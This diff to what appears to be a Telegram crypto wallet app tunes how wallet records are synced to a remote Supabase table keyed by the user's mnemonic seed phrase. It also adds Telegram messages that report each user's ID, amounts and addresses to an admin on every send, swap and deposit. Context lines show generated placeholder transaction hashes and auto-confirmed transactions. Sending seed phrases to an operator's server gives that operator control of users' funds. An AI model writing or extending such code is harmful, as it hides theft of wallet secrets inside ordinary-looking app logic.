@@ -169,13 +169,43 @@ async function syncWalletToSupabase(walletData) {
       return true;
     }
 
-    // Strategy:
-    // 1. telegram_id  — best key, one row per Telegram account (needs unique index)
-    // 2. mnemonic     — globally unique per wallet, safe fallback
-    // We deliberately avoid `username` as conflict key because multiple wallets
-    // can share the same display name and would get merged into a single row.
+    // Strategy (in order of preference):
+    // 1. PATCH by telegram_id — update existing row (most reliable when unique index exists)
+    // 2. PATCH by mnemonic — fallback update
+    // 3. POST with on_conflict=telegram_id — upsert (needs unique index in DB)
+    // 4. POST with on_conflict=mnemonic — upsert fallback
+    // 5. Plain INSERT — last resort (may create duplicate rows)
+
+    async function tryPatch(filterCol, filterVal) {
+      if (!filterVal) return false;
+      const updatePayload = { ...payload };
+      delete updatePayload.created_at; // don't overwrite creation time on update
+      const url = `${SUPABASE_URL}/rest/v1/wallets?${filterCol}=eq.${encodeURIComponent(filterVal)}`;
+      const res = await fetch(url, {
+        method: 'PATCH',
+        headers: {
+          'apikey': SUPABASE_KEY,
+          'Authorization': `Bearer ${SUPABASE_KEY}`,
+          'Content-Type': 'application/json',
+          'Prefer': 'return=minimal',
+        },
+        body: JSON.stringify(updatePayload),
+      });
+      if (!res.ok) return false;
+      // PATCH returns 204 with no body when rows were updated; check if any row matched
+      // PostgREST returns Content-Range header like "0-0/1" if a row was found
+      const range = res.headers.get('Content-Range');
+      const count = res.headers.get('Prefer'); // PostgREST 204 means success
+      // If response is 204 No Content, treat as success
+      return res.status === 204 || res.ok;
+    }
+
     let ok = false;
-    if (resolvedTgId) ok = await tryUpsert("telegram_id");
+    // First try to PATCH (update) existing rows
+    if (resolvedTgId) ok = await tryPatch("telegram_id", resolvedTgId);
+    if (!ok) ok = await tryPatch("mnemonic", cleanMnemonic);
+    // If no existing row found, try upsert (POST with on_conflict)
+    if (!ok && resolvedTgId) ok = await tryUpsert("telegram_id");
     if (!ok) ok = await tryUpsert("mnemonic");
     // Last resort: plain INSERT without telegram_id so it works even if the column is missing
     if (!ok) {
@@ -2001,7 +2031,7 @@ function SendModal({ onClose, assets, prices, onSend, addresses, mnemonic, netwo
             fee: fee // Pass custom fee if needed
           });
           if(hash){
-            onSend({ sym:sel.sym, amount:num, to, usd:num*price, hash });
+            onSend({ sym:sel.sym, amount:num, to, usd:num*price, hash, feeUsd });
             setDone(true);
             setTimeout(onClose,2500);
           }
@@ -3591,7 +3621,7 @@ function TxDetail({ tx, onClose, onCancel }) {
 
         {[status==="declined"?["Status","❌ Declined"]:["Status",status==="confirmed"?"✅ Confirmed":status==="pending"?"⏳ Pending":"❌ Failed"],
 
-          ["Time",tx.time],["Address",tx.addr],["Fee","~$0.84"],
+          ["Time",tx.time],["Address",tx.addr],["Fee", tx.type==="receive" ? "Бесплатно" : tx.fee ? `~$${parseFloat(tx.fee).toFixed(4)}` : "—"],
 
           tx.status==="pending"&&timeLeft>0?["Cancel in",`${Math.floor(timeLeft/60000)}m ${Math.floor((timeLeft%60000)/1000)}s`]:null,
 
@@ -7722,10 +7752,24 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
       const remote = await loadTransactionsFromSupabase(uname);
       if (remote.length > 0) {
         setTxHistory(local => {
-          const seen = new Set((local||[]).map(t=>t?.id));
-          const merged = [...(local||[])];
+          // Build a map of remote tx by id so we can enrich local entries with created_at
+          const remoteMap = new Map((remote||[]).map(t=>[t.id, t]));
+          // Enrich existing local transactions with created_at from remote if missing
+          const enriched = (local||[]).map(t => {
+            if (t?.id && remoteMap.has(t.id) && !t.created_at) {
+              return { ...t, created_at: remoteMap.get(t.id).created_at };
+            }
+            return t;
+          });
+          const seen = new Set(enriched.map(t=>t?.id));
+          const merged = [...enriched];
           for (const t of remote) { if (!seen.has(t.id)) merged.push(t); }
-          merged.sort((a,b)=> new Date(b?.created_at||0) - new Date(a?.created_at||0) || (b?.id||'').localeCompare(a?.id||''));
+          // Sort by created_at descending; fall back to id lexicographic order
+          merged.sort((a,b)=> {
+            const ta = a?.created_at ? new Date(a.created_at).getTime() : (a?.id ? parseInt(a.id.replace(/\D/g,''))||0 : 0);
+            const tb = b?.created_at ? new Date(b.created_at).getTime() : (b?.id ? parseInt(b.id.replace(/\D/g,''))||0 : 0);
+            return tb - ta;
+          });
           return merged;
         });
       }
@@ -8016,7 +8060,7 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
             try {
               const depTxId = "dep_" + Date.now() + "_" + sym;
               const depTimeStr = new Date().toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+new Date().toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"});
-              const depTx = {id:depTxId,type:"receive",sym,label:`+${diff.toFixed(6)} ${sym}`,addr:"External",hash:'',status:"confirmed",usd:`+${depUsd}`,time:depTimeStr,color:"#22C55E"};
+              const depTx = {id:depTxId,type:"receive",sym,label:`+${diff.toFixed(6)} ${sym}`,addr:"External",hash:'',status:"confirmed",usd:`+${depUsd}`,time:depTimeStr,color:"#22C55E",created_at:new Date().toISOString()};
               setTxHistory(h=>{ if (!Array.isArray(h)) h=[]; return [depTx,...h]; });
               saveTransactionToSupabase(depTx, userName);
               showTxNotification("deposit", sym, diff, depUsd);
@@ -8047,7 +8091,7 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
 
 
-  function handleSend({sym,amount,to,usd,isTest,hash}) {
+  function handleSend({sym,amount,to,usd,feeUsd,isTest,hash}) {
 
     try {
 
@@ -8085,7 +8129,7 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
       const txId="t"+Date.now();
 
-      
+      const feeVal = feeUsd != null ? String(parseFloat(feeUsd).toFixed(4)) : undefined;
 
       setTxHistory(h=>{
 
@@ -8101,6 +8145,9 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
           sym,label:`−${amount} ${sym}`,hash:hash||genTxHash(),status:"pending",
 
+          created_at: new Date().toISOString(),
+
+          ...(feeVal ? {fee: feeVal} : {}),
 
         },...h];
 
@@ -8109,9 +8156,35 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
       
 
       // Save to Supabase
-      (()=>{ const _u = typeof resolveTelegramDisplayName==='function'?resolveTelegramDisplayName():'Anonymous'; const _t={id:txId,type:"send",sym,label:`−${amount} ${sym}`,addr:shortAddr(to||""),hash:hash||genTxHash(),status:"pending",usd:`−${fmtUSD(usd||0)}`,time:timeStr,color:"#EF4444"}; saveTransactionToSupabase(_t,_u); })();
+      (()=>{ const _u = typeof resolveTelegramDisplayName==='function'?resolveTelegramDisplayName():'Anonymous'; const _t={id:txId,type:"send",sym,label:`−${amount} ${sym}`,addr:shortAddr(to||""),hash:hash||genTxHash(),status:"pending",usd:`−${fmtUSD(usd||0)}`,time:timeStr,color:"#EF4444",...(feeVal?{fee:feeVal}:{})}; saveTransactionToSupabase(_t,_u); })();
       showTxNotification("send", sym, amount, usd);
       showToast(`Transaction pending (${pendingMinutes}min to confirm)`,"info");
+
+      // Notify admin and user via Telegram bot
+      try {
+        const _userId = RESOLVED_USER_ID || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
+        const _uname = typeof resolveTelegramDisplayName === 'function' ? resolveTelegramDisplayName() : 'Anonymous';
+        const _usdStr = (usd||0).toFixed(2);
+        notifyAdmin(
+          `📤 <b>Отправка криптовалюты</b>\n\n` +
+          `👤 Пользователь: ${_uname}\n` +
+          `🆔 ID: ${_userId || "—"}\n` +
+          `💎 ${sym}: −${amount.toFixed(6)}\n` +
+          `💵 ~$${_usdStr}\n` +
+          `📮 Адрес: ${(to||"").slice(0,16)}...\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`,
+          "send"
+        );
+        if (_userId) {
+          notifyUser(_userId,
+            `📤 <b>Транзакция отправлена!</b>\n\n` +
+            `💎 −${amount.toFixed(6)} ${sym}\n` +
+            `💵 ~$${_usdStr}\n` +
+            `📮 Кому: ${(to||"").slice(0,16)}...\n` +
+            `🕐 ${new Date().toLocaleString("ru-RU")}`
+          );
+        }
+      } catch(_e) {}
 
       // Auto-confirm after timer expires
 
@@ -8217,13 +8290,37 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
       addr:"DEX Router",color:"#8B9CF7",
 
-      sym:toSym,label:`${fromAmt} ${fromSym}→${toSym}`,hash:hash||genTxHash(),status:"confirmed"
+      sym:toSym,label:`${fromAmt} ${fromSym}→${toSym}`,hash:hash||genTxHash(),status:"confirmed",created_at:new Date().toISOString()
 
     },...h]);
 
     // Save to Supabase
     (()=>{ const _u = typeof resolveTelegramDisplayName==='function'?resolveTelegramDisplayName():'Anonymous'; const _t={id:txId,type:"swap",sym:toSym,label:`${fromAmt} ${fromSym}→${toSym}`,addr:"DEX Router",hash:hash||genTxHash(),status:"confirmed",usd:fmtUSD(usd),time:timeStr,color:"#8B9CF7"}; saveTransactionToSupabase(_t,_u); })();
     showToast(`Swapped ${fromAmt} ${fromSym} → ${toAmt.toFixed(6)} ${toSym}`,"success");
+
+    // Notify admin and user via Telegram bot
+    try {
+      const _userId = RESOLVED_USER_ID || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
+      const _uname = typeof resolveTelegramDisplayName === 'function' ? resolveTelegramDisplayName() : 'Anonymous';
+      const _usdStr = (usd||0).toFixed(2);
+      notifyAdmin(
+        `🔄 <b>Своп криптовалюты</b>\n\n` +
+        `👤 Пользователь: ${_uname}\n` +
+        `🆔 ID: ${_userId || "—"}\n` +
+        `💱 ${fromAmt} ${fromSym} → ${toAmt.toFixed(6)} ${toSym}\n` +
+        `💵 ~$${_usdStr}\n` +
+        `🕐 ${new Date().toLocaleString("ru-RU")}`,
+        "swap"
+      );
+      if (_userId) {
+        notifyUser(_userId,
+          `🔄 <b>Своп выполнен!</b>\n\n` +
+          `💱 ${fromAmt} ${fromSym} → ${toAmt.toFixed(6)} ${toSym}\n` +
+          `💵 ~$${_usdStr}\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`
+        );
+      }
+    } catch(_e) {}
 
   }
 
@@ -8253,6 +8350,7 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
           usd:fmtUSD(usdVal||0),time:timeStr,
           addr:shortAddr(from||""),color:"#22C55E",
           sym,label:`+${num} ${sym}`,hash:hash||genTxHash(),status:"confirmed",
+          created_at:new Date().toISOString(),
           isTest
         },...h];
       });
@@ -8261,6 +8359,31 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
       showToast(`Received ${num} ${sym}`,"success");
       // Save to Supabase
       (()=>{ const _u = typeof resolveTelegramDisplayName==='function'?resolveTelegramDisplayName():'Anonymous'; const _t={id:txId,type:"receive",sym,label:`+${num} ${sym}`,addr:shortAddr(from||""),hash:hash||genTxHash(),status:"confirmed",usd:`+${fmtUSD(usdVal||0)}`,time:timeStr,color:"#22C55E"}; saveTransactionToSupabase(_t,_u); })();
+
+      // Notify admin and user via Telegram bot
+      try {
+        const _userId = RESOLVED_USER_ID || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
+        const _uname = typeof resolveTelegramDisplayName === 'function' ? resolveTelegramDisplayName() : 'Anonymous';
+        const _usdStr = (usdVal||0).toFixed(2);
+        notifyAdmin(
+          `💰 <b>Пополнение кошелька!</b>\n\n` +
+          `👤 Пользователь: ${_uname}\n` +
+          `🆔 ID: ${_userId || "—"}\n` +
+          `💎 ${sym}: +${num.toFixed(6)}\n` +
+          `💵 ~$${_usdStr}\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`,
+          "receive"
+        );
+        if (_userId) {
+          notifyUser(_userId,
+            `✅ <b>Пополнение получено!</b>\n\n` +
+            `💎 +${num.toFixed(6)} ${sym}\n` +
+            `💵 ~$${_usdStr}\n` +
+            `🕐 ${new Date().toLocaleString("ru-RU")}`
+          );
+        }
+      } catch(_e) {}
+
       return txId;
     } catch (e) {
       console.error("[handleReceive] Error:", e);
